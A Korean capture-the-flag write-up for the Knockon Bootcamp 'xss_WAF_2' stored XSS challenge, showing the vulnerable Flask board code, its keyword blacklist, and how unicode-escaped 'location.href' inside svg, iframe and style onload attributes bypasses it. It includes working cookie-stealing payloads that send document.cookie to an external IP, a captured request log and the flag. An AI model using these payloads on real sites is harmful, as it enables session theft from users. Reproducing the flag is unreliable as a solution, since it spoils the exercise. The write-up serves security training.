---
title: "[Writeup] Knockon Bootcamp - 5.2 xss_WAF_2"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - Cross Site Scripting
  - Stored XSS
  - Filter Bypass
last_modified_at: 2024-09-08T18:50:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10041/>

![5.2 xss_WAF_2 1](/assets/images/writeup/web-hacking/knock-on/5-2_XSS_1.png)

![5.2 xss_WAF_2 2](/assets/images/writeup/web-hacking/knock-on/5-1_XSS_2.png)

![5.2 xss_WAF_2 3](/assets/images/writeup/web-hacking/knock-on/5-1_XSS_3.png)


|

|

|

### 목표

---

게시판에 악성 스크립트를 추가하여 쿠키 값 탈취하기

|

### 공격 기법

---

Cross Site Scripting

- Stored XSS
- Filter Bypass

|

|

|

## 문제 코드

```python
from flask import Flask, render_template, request, redirect, url_for, flash
from flask_sqlalchemy import SQLAlchemy

import os
import requests

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

app = Flask(__name__)

MYSQL_DATABASE = os.getenv("MYSQL_DATABASE")
MYSQL_USER = os.getenv("MYSQL_USER")
MYSQL_PASSWORD = os.getenv("MYSQL_PASSWORD")
MYSQL_HOST = os.getenv("MYSQL_HOST")
SECRET_KEY = os.getenv("ADMIN_SECRET_KEY")
CHROMEDRIVER_PATH = os.getenv("CHROMEDRIVER_PATH")
localhost = "http://localhost:10006"

app.secret_key = SECRET_KEY
app.config["SQLALCHEMY_DATABASE_URI"] = (
    f"mysql+pymysql://{MYSQL_USER}:{MYSQL_PASSWORD}@{MYSQL_HOST}/{MYSQL_DATABASE}"
)
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)

class Post(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(100), nullable=False)
    content = db.Column(db.Text, nullable=False)

    def __repr__(self):
        return f"Post('{self.title}', '{self.content}')"

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/board")
def board():
    posts = Post.query.all()
    message = request.args.get("message", None)
    return render_template("board.html", posts=posts, message=message)

black_list = ["script","img","audio","body","video","object","meta","location","href","alert","window"]

@app.route("/add", methods=["GET", "POST"])
def add_post():
    if request.method == "POST":
        title = request.form["title"] #no not try XSS in title!
        content = request.form["content"].lower()
        for black in black_list :
            if black in content:
                content = content.replace(black,"")
        post = Post(title=title, content=content)
        db.session.add(post)
        db.session.commit()
        return redirect(url_for("board"))
    return render_template("add_post.html")

@app.route("/post/<int:post_id>")
def view_post(post_id):
    post = Post.query.get_or_404(post_id)
    return render_template("post.html", post=post)

@app.route("/delete/<int:post_id>", methods=["GET"])
def delete_post(post_id):
    post = Post.query.get_or_404(post_id)
    db.session.delete(post)
    db.session.commit()
    return redirect(url_for("board"))

@app.route("/search", methods=["GET", "POST"])
def search():
    if request.method == "POST":
        search_term = request.form["search"]
        posts = Post.query.filter(
            Post.title.contains(search_term) | Post.content.contains(search_term)
        ).all()
        return render_template("search.html", posts=posts)
    return render_template("search.html")

def read_url(url, cookie={"name": "name", "value": "value"}):
    driver = None
    try:
        service = Service(executable_path=CHROMEDRIVER_PATH)

        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        options.add_argument("--window-size=1920x1080")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")

        driver = webdriver.Chrome(service=service, options=options)

        driver.implicitly_wait(3)
        driver.set_page_load_timeout(10)

        driver.get(localhost)
        driver.add_cookie(cookie)
        driver.get(url)

    except Exception as e:
        if driver:
            driver.quit()
        return False
    finally:
        if driver:
            driver.quit()
        return True

@app.route("/admin/<int:post_id>", methods=["GET", "POST"])
def admin(post_id):
    target_url = localhost + f"/post/{post_id}"

    if requests.get(target_url).status_code == 404:
        message = f"Unvalid Post ID"
        posts = Post.query.all()
        return render_template("board.html", posts=posts, message=message)

    cookie = {"name": "cookie", "value": SECRET_KEY}
    success = read_url(target_url, cookie)

    if success:
        message = f"Bot activated successfully and visited: {target_url}"
    else:
        message = f"Bot activation failed: {target_url}"

    posts = Post.query.all()
    return render_template("board.html", posts=posts, message=message)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10006, debug=True)
```

|

|

|

## 코드 분석

### add_post()

---

```python
black_list = ["script","img","audio","body","video","object","meta","location","href","alert","window"]

@app.route("/add", methods=["GET", "POST"])
def add_post():
    if request.method == "POST":
        title = request.form["title"] #no not try XSS in title!
        content = request.form["content"].lower()
        for black in black_list :
            if black in content:
                content = content.replace(black,"")
        post = Post(title=title, content=content)
        db.session.add(post)
        db.session.commit()
        return redirect(url_for("board"))
    return render_template("add_post.html")
```

`black_list`에 뭐가 많이 추가됨

이전에 썼던 `<body>`태그가 막혔지만 `onload`는 여전히 사용 가능

하지만 가장 중요한 `location`과 `href`가 막힘

|

|

|

## Exploit

### onload 사용 가능 태그 찾기

---

`onload` 속성을 활용하겠음

`onload` 속성을 사용할 수 있는 태그는 `black_list`에 있는 태그를들 제외하고 `svg, iframe, style` 등이 있음

|

|

### location.href 우회

---

`location`과 `href`를 사용해야 쿠키를 탈취할 수 있음

이는 유니코드 이스케이프 시퀸스로 대체 가능

[Unicode Escape Encoder / Decoder Online - DenCode](https://dencode.com/string/unicode-escape)

|

```html
<svg onload="\u0061lert(1)">

<svg onload=\u006Cocation.\u0068ref="http://20.41.120.97:10010/"+document.cookie>

<iframe onload=\u006Cocation.\u0068ref="http://20.41.120.97:10010/"+document.cookie>

<style onload=\u006Cocation.\u0068ref="http://20.41.120.97:10010/"+document.cookie>
```

알파벳을 하나씩 유니코드로 변환 후 게시글을 작성하면 스크립트가 실행됨

|

|

### 결과

```sh
GET /cookie=K0%7Breplace_is_for_loop%7D HTTP/1.1
Host: 20.41.120.97:10010
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/126.0.6478.126 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost:10006/
Accept-Encoding: gzip, deflate
```

|

|

|

## Payload

```html
<svg onload=\u006Cocation.\u0068ref="http://20.41.120.97:10010/"+document.cookie>
```

|

|

### FLAG

---

```sh
K0{replace_is_for_loop}
```

|

---